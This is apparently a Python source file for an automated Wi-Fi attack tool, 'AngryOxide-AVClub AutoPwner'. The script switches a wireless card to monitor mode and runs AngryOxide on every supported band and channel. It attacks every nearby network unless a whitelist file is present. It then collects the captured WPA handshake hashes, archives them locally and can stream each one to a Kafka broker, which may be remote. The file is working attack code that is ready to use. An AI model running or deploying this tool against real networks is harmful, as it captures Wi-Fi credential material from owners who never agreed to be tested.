import subprocess
import time
import sys
import csv
import pandas as pd
import re
import os
import json
import shutil
import argparse
from kafka import KafkaProducer

# ======================
# Global Configurations
# ======================

sysId = 'Attack1'
MODULE_INTERVAL = 5  # Interval in seconds to run attack modules
KAFKA_BROKER = 'localhost:9092'  # Default Kafka broker
WHITELIST_FILE = 'whitelist.txt'  # Passed to AngryOxide with --whitelist

# AngryOxide band IDs (from nl80211): 2 = 2.4 GHz, 5 = 5 GHz, 6 = 6 GHz, 60 = 60 GHz.
# Passing --band <id> tells AngryOxide to scan every channel the interface is
# actually capable of in that band (it reads the enabled-channel list straight
# from nl80211); bands the card does not support are ignored. This covers all
# capable channels across all bands instead of a fixed 2.4 GHz channel list.
# Trim this to restrict scanning, e.g. ['2'] for 2.4 GHz only or ['5'] for 5 GHz.
SCAN_BANDS = ['2', '5', '6']  # 2.4 GHz, 5 GHz, 6 GHz
ARCHIVE_DIR = 'hashes'  # Where local mode keeps a copy of each hash file

DESC_MESSAGE = \
  r">>============================================<<" + "\n"\
+ r"||     _    ___               ___     ______  ||"  + "\n"\
+ r"||    / \  / _ \             / \ \   / / ___| ||"  + "\n"\
+ r"||   / _ \| | | |  _____    / _ \ \ / / |     ||"  + " by dr0pp1n\n"\
+ r"||  / ___ \ |_| | |_____|  / ___ \ V /| |___  ||"  + " Version 0.8\n"\
+ r"|| /_/   \_\___/          /_/   \_\_/  \____| ||"  + " Build 260917\n"\
+ r"||                                            ||"  + " AutoPwner\n"\
+ r">>============================================<<"  + "\n"

WELCOME_MESSAGE = DESC_MESSAGE \
+ "[*] AngryOxide-AVClub Automatic Wi-Fi Pwner starting up...\n"\
+ "[!] Select an interface to convert to monitor mode.\n"\
+ "[!] Send SIGINT (Ctrl-C) to exit.\n"

# ======================
# Helper Functions
# ======================

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description=DESC_MESSAGE,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 AVC.py
  python3 AVC.py -b 192.168.1.100:9092
  python3 AVC.py --interval 10
  python3 AVC.py -a config.json
  python3 AVC.py -a config.json -b 192.168.1.100:9092
  python3 AVC.py -lo
  python3 AVC.py -b 192.168.1.100:9092 -lo
  python3 AVC.py -h
        '''
    )

    # Interface Selection
    interface_group = parser.add_argument_group('Interface Selection')
    interface_group.add_argument('-a', '--auto', type=str, default=None, nargs='?', const='interfaces.json',
                                 metavar='CONFIG.JSON',
                                 help='Auto-select wireless interface from JSON config file (default: interfaces.json)')

    # Output Configuration
    output_group = parser.add_argument_group('Output Configuration')
    output_group.add_argument('-b', '--broker', type=str, default=None, metavar='BROKER',
                              help='Kafka broker address (ip:port), e.g., 192.168.1.100:9092')
    output_group.add_argument('-lo', '--local', action='store_true', dest='local',
                              help='Save hashes to local "hashes" folder (default if neither -lo nor -b specified)')

    # Scan Configuration
    scan_group = parser.add_argument_group('Scan Configuration')
    scan_group.add_argument('-i', '--interval', type=int, default=MODULE_INTERVAL, metavar='SECONDS',
                            help=f'Scan interval in seconds (default: {MODULE_INTERVAL})')

    return parser.parse_args()

def list_wireless_interfaces():
    """List available wireless interfaces on the system."""
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                iface = line.split()[0]
                interfaces.append(iface)
        return interfaces
    except Exception as e:
        print(f"[!] Error listing interfaces: {e}")
        return []

def select_interface():
    """Prompt user to select a wireless interface."""
    interfaces = list_wireless_interfaces()
    if not interfaces:
        print("[!] No wireless interfaces found.")
        sys.exit(1)

    print("\n[*] Available wireless interfaces:")
    for i, iface in enumerate(interfaces, 1):
        print(f"  {i}. {iface}")

    while True:
        try:
            choice = int(input("\n[*] Select interface (number): "))
            if 1 <= choice <= len(interfaces):
                return interfaces[choice - 1]
            else:
                print("[!] Invalid selection. Try again.")
        except ValueError:
            print("[!] Invalid input. Enter a number.")

def load_interfaces_from_json(json_file):
    """Load wireless interfaces from a JSON configuration file."""
    try:
        with open(json_file, 'r') as f:
            data = json.load(f)
        if isinstance(data, dict) and 'interfaces' in data:
            return data['interfaces']
        elif isinstance(data, list):
            return data
        else:
            print("[!] Invalid JSON format. Expected list or dict with 'interfaces' key.")
            return []
    except Exception as e:
        print(f"[!] Error loading JSON file: {e}")
        return []

def auto_select_interface(json_file):
    """Auto-select an interface from JSON file if available on the system."""
    configured_interfaces = load_interfaces_from_json(json_file)
    if not configured_interfaces:
        print("[!] No interfaces found in JSON file.")
        sys.exit(1)

    available_interfaces = list_wireless_interfaces()
    if not available_interfaces:
        print("[!] No wireless interfaces found on system.")
        sys.exit(1)

    for iface in configured_interfaces:
        if iface in available_interfaces:
            print(f"[+] Auto-selected interface: {iface}")
            return iface

    print("[!] No configured interfaces found on this system.")
    print(f"[!] Available interfaces: {', '.join(available_interfaces)}")
    sys.exit(1)

def enable_monitor_mode(interface):
    """Enable monitor mode on the selected interface."""
    try:
        print(f"\n[*] Enabling monitor mode on {interface}...")
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
        subprocess.run(['sudo', 'iw', interface, 'set', 'monitor', 'none'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
        print(f"[+] Monitor mode enabled on {interface}")
        return True
    except Exception as e:
        print(f"[!] Error enabling monitor mode: {e}")
        return False

def open_csv(file_path):
    """Opens a CSV file and returns its contents as a list of lists."""
    with open(file_path, 'r') as file:
        reader = csv.reader(file)
        data = list(reader)
    return data

def is_blank_row(row):
    if row is None:
        return True
    if not isinstance(row, (list, tuple)):
        return False
    for cell in row:
        if isinstance(cell, str):
            if cell.strip() != '':
                return False
        elif cell is not None:
            return False
    return True

def list_to_df(data):
    """Converts a list of lists into a pandas DataFrame."""
    clean = [row for row in data if not is_blank_row(row)]
    if not clean:
        return pd.DataFrame()
    headers = clean[0]
    rows = clean[1:]
    df = pd.DataFrame(rows, columns=headers)
    return df

def split_dataframe_on_marker(df, marker='Station MAC', col_index=None):
    """
    Split a DataFrame into two parts where a row indicates the start of a new table.
    Returns (top_df, bottom_df). If marker not found, returns (df, empty_df).
    """
    if df is None or df.empty:
        return df, pd.DataFrame()

    mask = pd.Series(False, index=df.index)

    if col_index is not None:
        try:
            col = df.iloc[:, col_index].astype(str).str.strip()
            mask = col.eq(marker) | col.str.contains(re.escape(marker), case=False, na=False)
        except Exception:
            mask = pd.Series(False, index=df.index)

    if not mask.any():
        try:
            mask = df.astype(str).apply(lambda c: c.str.strip().str.contains(re.escape(marker), case=False, na=False)).any(axis=1)
        except Exception:
            mask = pd.Series(False, index=df.index)

    if not mask.any():
        return df, pd.DataFrame()

    match_idx = mask[mask].index[0]
    pos = df.index.get_loc(match_idx)
    header_row = df.iloc[pos].tolist()
    top_df = df.iloc[:pos].reset_index(drop=True)
    bottom_df = df.iloc[pos+1:].reset_index(drop=True)

    if not bottom_df.empty:
        if len(header_row) != bottom_df.shape[1]:
            if len(header_row) < bottom_df.shape[1]:
                header_row = header_row + [f'col{i}' for i in range(len(header_row), bottom_df.shape[1])]
            else:
                header_row = header_row[:bottom_df.shape[1]]
        bottom_df.columns = [str(h).strip() for h in header_row]

    return top_df, bottom_df

def parse_hash_filename(hc_file):
    """Extract (essid, bssid) from an AngryOxide hash filename: essid_BSSID.hc22000"""
    name_without_ext = hc_file[:-len('.hc22000')]
    # Split on the last underscore; sanitized ESSIDs may contain underscores.
    parts = name_without_ext.rsplit('_', 1)
    if len(parts) == 2:
        return parts[0], parts[1]
    return name_without_ext, 'unknown'

def publish_to_kafka(topic, message, broker='localhost:9092'):
    """Publish a message to a Kafka topic and print to terminal."""
    try:
        producer = KafkaProducer(
            bootstrap_servers=[broker],
            value_serializer=lambda v: json.dumps(v).encode('utf-8')
        )
        producer.send(topic, value=message)
        producer.flush()
        print(f"[+] Published to Kafka topic '{topic}': {message}")
        producer.close()
    except Exception as e:
        print(f"[!] Error publishing to Kafka: {e}")

# ======================
# Main Function
# ======================
def main(interval, broker, use_local, use_kafka, auto_config):
    print("[*] Cleaning up...")
    subprocess.run(["./cleanup.sh"])

    # Select interface (auto or manual)
    if auto_config:
        selected_interface = auto_select_interface(auto_config)
    else:
        selected_interface = select_interface()

    if not enable_monitor_mode(selected_interface):
        print("[!] Failed to enable monitor mode. Exiting.")
        sys.exit(1)

    # AngryOxide always writes .hc22000 files into the working directory, so that
    # is where we poll. Local mode keeps an archived copy in the hashes folder.
    hash_dir = '.'
    archive_dir = None
    if use_local:
        os.makedirs(ARCHIVE_DIR, exist_ok=True)
        archive_dir = ARCHIVE_DIR
        print(f"[+] Created/using '{archive_dir}' folder for local output")

    print("[*] Starting attack modules...")
    # Start AngryOxide subprocess
    print(f"[*] Starting AngryOxide on {selected_interface}...")
    angryoxide_cmd = ['sudo', 'angryoxide', '-i', selected_interface, '-r', '3', '--headless', '--notar']
    # Scan every channel the interface supports across all configured bands
    # rather than a fixed 2.4 GHz list. AngryOxide expands each --band to the
    # interface's capable channels and ignores bands the card cannot use.
    for band in SCAN_BANDS:
        angryoxide_cmd.extend(['--band', band])
    band_names = {'2': '2.4 GHz', '5': '5 GHz', '6': '6 GHz', '60': '60 GHz'}
    print(f"[*] Scanning all capable channels in bands: {', '.join(band_names.get(b, b) for b in SCAN_BANDS)}")
    # --whitelist loads a file; the -w short flag takes a single MAC/SSID instead.
    if os.path.isfile(WHITELIST_FILE):
        angryoxide_cmd.extend(['--whitelist', WHITELIST_FILE])
        print(f"[+] Loading whitelist from '{WHITELIST_FILE}'")
    else:
        print(f"[!] Whitelist file '{WHITELIST_FILE}' not found - nothing will be excluded from attacks.")
    angryoxide = subprocess.Popen(angryoxide_cmd,
                                  stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[*] Started AngryOxide with PID {angryoxide.pid}")
    print(f"[*] Scan interval: {interval} seconds")
    print(f"[*] Watching for .hc22000 files in '{os.path.abspath(hash_dir)}'")
    if use_local:
        print(f"[*] Output mode: Local files archived to '{archive_dir}' folder")
    if use_kafka:
        print(f"[*] Kafka broker: {broker}")
    if use_local and use_kafka:
        print("[*] Hash files will be saved locally AND published to Kafka")

    seen_files = set()
    processed_hashes = set()

    # Main loop
    while True:
        try:
            time.sleep(interval)

            # Find all .hc22000 files in configured directory
            hc_files = [f for f in os.listdir(hash_dir) if f.endswith('.hc22000')]

            for hc_file in hc_files:
                if hc_file not in seen_files:
                    print(f"[*] Found new hash file: {hc_file}")
                    seen_files.add(hc_file)
                try:
                    essid, bssid = parse_hash_filename(hc_file)

                    # Re-read each file every pass; AngryOxide appends new
                    # handshakes to an existing file as it collects them.
                    file_path = os.path.join(hash_dir, hc_file)
                    new_hashes = 0
                    with open(file_path, 'r') as f:
                        for line in f:
                            line = line.strip()
                            if not line or line in processed_hashes:
                                continue
                            processed_hashes.add(line)
                            new_hashes += 1
                            message = {
                                'sysId': sysId,
                                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                                'essid': essid,
                                'bssid': bssid,
                                'hash': line
                            }
                            print(f"[+] Read hash from {essid} ({bssid}): {line}")
                            if use_kafka:
                                publish_to_kafka('wifi-hash', message, broker=broker)

                    # Archive locally so captures survive the next cleanup.sh run
                    if new_hashes and archive_dir:
                        shutil.copy2(file_path, os.path.join(archive_dir, hc_file))
                        print(f"[+] Saved {hc_file} to '{archive_dir}/' ({new_hashes} new hashline(s))")
                except Exception as e:
                    print(f"[!] Error reading {hc_file}: {e}")

        except KeyboardInterrupt:
            print("\n[!] SIGINT detected (Ctrl-C), shutting down gracefully...")
            print("[*] Terminating subprocesses...")
            if angryoxide:
                angryoxide.terminate()
            break
        except Exception as e:
            print(f"[!] Exception occurred: {e}")

# ======================
# Main Loop (calls main)
# ======================

if __name__ == "__main__":
    try:
        args = parse_arguments()
        print(WELCOME_MESSAGE)

        # Determine output modes (default to local if neither specified)
        use_kafka = args.broker is not None
        use_local = args.local or (args.broker is None)

        # Set broker to default if Kafka is enabled but no broker specified
        broker = args.broker if use_kafka else None

        # Display output mode
        if use_local and use_kafka:
            print("[*] Output mode: Local + Kafka")
        elif use_kafka:
            print("[*] Output mode: Kafka")
        else:
            print("[*] Output mode: Local (default)")

        main(interval=args.interval, broker=broker, use_local=use_local, use_kafka=use_kafka, auto_config=args.auto)
    except KeyboardInterrupt:
        print("\n[!] SIGINT detected (Ctrl-C), exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)
